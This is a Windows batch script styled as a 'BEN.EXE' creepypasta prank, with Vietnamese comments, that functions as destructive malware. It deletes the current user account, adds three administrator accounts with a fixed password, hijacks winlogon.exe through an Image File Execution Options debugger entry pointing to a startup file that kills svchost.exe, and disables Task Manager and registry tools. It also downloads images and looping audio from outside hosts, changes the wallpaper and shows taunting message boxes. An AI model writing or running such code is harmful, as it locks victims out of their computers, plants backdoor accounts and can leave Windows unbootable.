@echo off
title BEN.EXE
mkdir "%temp%\din"
echo really start (y/n)==
set /p input=
if %input%==y goto hack
if %input%==n goto exit

:hack
set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
echo taskkill /f /im svchost.exe  > "%startup%\BLOODBENISHERE.bat"


powershell -NoExit -Command ^
"[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; ^
$notify = New-Object System.Windows.Forms.NotifyIcon; ^
$notify.Icon = [System.Drawing.SystemIcons]::Information; ^
$notify.BalloonTipTitle = 'BEN.EXE'; ^
# Tạo thư mục nếu chưa có
if (-not (Test-Path '$env:TEMP\din')) { New-Item -ItemType Directory -Path '$env:TEMP\din' | Out-Null }; ^
# Tải ảnh
Invoke-WebRequest 'https://raw.githubusercontent.com/dnndj-39/Benjpg/1f9d9e2549cd9dc8164d6ed701ff19066db99fb4/Ben_Drowned.jpg' -OutFile '$env:TEMP\din\Ben-Drowned.jpg'; ^
$notify.BalloonTipText = 'GOOD LUCK'; ^
$notify.Visible = $true; ^
$notify.ShowBalloonTip(5000)"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "%startup%\BLOODBENISHERE.bat" /f
net user /delete %username%
net user /add Anonymousnake1 T4@123456
net user /add Anonymousnake2 T4@123456
net user /add Anonymousnake3 T4@123456
net localgroup Administrators Anonymousnake1 /add
net localgroup Administrators Anonymousnake2 /add
net localgroup Administrators Anonymousnake3 /add


"

set "URL=https://i.postimg.cc/wvfBjpK2/images.jpg"
set "FILE=%TEMP%\din\BEN.jpg"

mkdir "%TEMP%\din" 2>nul
curl -o "%FILE%" "%URL%"

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%FILE%" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f

RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters



powershell -WindowStyle Hidden -Command ^
"if (-not (Test-Path '$env:TEMP\din')) { New-Item -ItemType Directory -Path '$env:TEMP\din' | Out-Null }; ^
$path = '$env:TEMP\din\ben-theme.wav'; ^
Invoke-WebRequest 'https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben-theme.wav' -OutFile $path; ^
Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command \""while($true){(New-Object Media.SoundPlayer ''' + $path + ''' ).PlaySync()}\""';"


reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC" ^ /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MMC\Snapins\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" ^ /v Allowed /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
set "vbsFile1=%temp%\din\ERROR1.vbs"
echo x=MsgBox("Hello, do you remember me?",0+16,"BEN.EXE") > "%vbsFile1%"

"%vbsFile1%"

set "vbsFile2=%temp%\din\ERROR2.vbs"
echo x=MsgBox("Yes I am your friend BEN.EXE! , I am come back! ",0+16,"BEN.EXE") > "%vbsFile2%"

"%vbsFile2%"

set "vbsFile3=%temp%\din\ERROR3.vbs"
echo x=MsgBox("You opened me up again!",0+16,"BEN.EXE") > "%vbsFile3%"

"%vbsFile3%"
set "vbsFile4=%temp%\din\ERROR4.vbs"
echo x=MsgBox("You let me in again! ",0+16,"BEN.EXE") > "%vbsFile4%"

"%vbsFile4%

set "vbsFile5=%temp%\din\ERROR5.vbs"
echo x=MsgBox("You Shouldn't Do That",0+16,"BEN.EXE") > "%vbsFile5%"
"%vbsfile5%"

set "vbsFile6=%temp%\din\ERROR6.vbs"
echo x=MsgBox("Ok I give you some advice",0+16,"BEN.EXE") > "%vbsFile6%"
"%vbsfile6%

set "vbsFile7=%temp%\din\ERROR7.vbs"
echo x=MsgBox("You better not turn off your computer",0+16,"BEN.EXE") > "%vbsFile7%"
"%vbsfile7%"

set "vbsFile8=%temp%\din\ERROR8.vbs"
echo x=MsgBox("If the computer is turn off",0+16,"BEN.EXE") > "%vbsFile8%"
"%vbsfile8%"

set "vbsFile8=%temp%\din\ERROR9.vbs"
echo x=MsgBox("YOUR COMPUTER IS DEAD",0+16,"BEN.EXE") > "%vbsFile9%"
"%vbsfile9%"

set "vbsFile10=%temp%\din\ERROR10.vbs"
echo x=MsgBox("I will not let you run away this time",0+16,"BEN.EXE") > "%vbsFile10%"
"%vbsfile10%"

set "vbsFile11=%temp%\din\ERROR11.vbs"
echo x=MsgBox("HAHAHAHAHAHAHAHA",0+16,"BEN.EXE") > "%vbsFile11%"


@echo off
title PictureBox Né Chuột - Ben Drowned

:: --- Thư mục chứa ps1 + ảnh ---
set "tempdir=%temp%\din"
if not exist "%tempdir%" mkdir "%tempdir%"

:: --- File ps1 ---
set "ps1=%tempdir%\form.ps1"

:: --- Tải ảnh về nếu chưa có ---
if not exist "%tempdir%\Ben-Drowned.jpg" (
    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dnndj-39/Benjpg/1f9d9e2549cd9dc8164d6ed701ff19066db99fb4/Ben_Drowned.jpg' -OutFile '%tempdir%\Ben-Drowned.jpg'"
)

:: --- Tạo PS1 ---
(
echo Add-Type -AssemblyName System.Windows.Forms
echo Add-Type -AssemblyName System.Drawing
echo.
echo $form = New-Object System.Windows.Forms.Form
echo $form.Text = "Ben Drowned"
echo $form.Width = 500
echo $form.Height = 800
echo $form.StartPosition = "CenterScreen"
echo $form.BackColor = "Black"
echo.
echo $pic = New-Object System.Windows.Forms.PictureBox
echo $pic.Width = 392
echo $pic.Height = 693
echo $pic.Left = 20
echo $pic.Top = 20
echo $pic.SizeMode = "StretchImage"
echo.
echo $imagePath = "%tempdir%\Ben-Drowned.jpg"
echo try {
echo ^    $pic.Image = [System.Drawing.Image]::FromFile($imagePath)
echo } catch {
echo ^    [System.Windows.Forms.MessageBox]::Show("Cannot load image!","Error")
echo ^    exit
echo }
echo.
echo $form.Controls.Add($pic)
echo.
echo $form.Add_MouseMove({
echo ^    param($sender, $e)
echo ^    $mouseX = $e.X
echo ^    $mouseY = $e.Y
echo ^    $x = $pic.Left
echo ^    $y = $pic.Top
echo ^    if (([Math]::Abs($mouseX - ($x + $pic.Width/2)) -lt 120) -and ([Math]::Abs($mouseY - ($y + $pic.Height/2)) -lt 120)) {
echo ^        $rand = New-Object System.Random
echo ^        $newX = $rand.Next(0, $form.ClientSize.Width - $pic.Width)
echo ^        $newY = $rand.Next(0, $form.ClientSize.Height - $pic.Height)
echo ^        $pic.Left = $newX
echo ^        $pic.Top = $newY
echo ^    }
echo })
echo.
echo $form.ShowDialog()
) > "%ps1%"

:: --- Chạy PowerShell với -NoExit để không thoát ---
powershell -NoExit -ExecutionPolicy Bypass -File "%ps1%"


:exit
exit

